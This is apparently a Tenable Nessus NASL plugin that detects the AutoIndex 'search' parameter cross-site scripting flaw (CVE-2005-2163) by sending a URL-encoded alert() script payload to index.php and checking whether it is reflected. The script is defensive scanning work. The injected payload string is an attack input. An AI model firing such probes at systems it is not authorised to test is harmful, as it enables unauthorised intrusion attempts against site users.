#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(19385);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2005-2163");
  script_bugtraq_id(14154);
  script_xref(name:"OSVDB", value:"17753");

  script_name(english:"AutoIndex PHP Script index.php search Variable XSS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is vulnerable to a
cross-site scripting issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running AutoIndex, a free PHP script for indexing
files in a directory. 

The installed version of AutoIndex fails to properly sanitize
user-supplied input to the 'search' parameter of the 'index.php'
script.  By leveraging this flaw, an attacker may be able to cause
arbitrary HTML and script code to be executed by a user's browser
within the context of the affected application, leading to cookie
theft and similar attacks." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2005-07/0038.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to AutoIndex version 1.5.3 or later if using 1.x, or to version 
2.1.1 or later if using 2.x." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();

 
  script_summary(english:"Checks for search parameter cross-site scripting vulnerability in AutoIndex");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/" + port + "/generic_xss")) exit(0);


# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + "');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = "%3Cscript%3Ealert('" + SCRIPT_NAME + "')%3B%3C%2Fscript%3E";


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw.
  r = http_send_recv3(port: port, method: 'GET', 
  item: strcat(dir, "/index.php?", "search='>", exss, "&", "searchMode=f"));
  if (isnull(r)) exit(0);

  # There's a problem if ...
  if (
    # it looks like AutoIndex and...
    "<body class='autoindex_body'>" >< r[2] &&
    # we see our XSS.
    xss >< r[2]
  ) {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
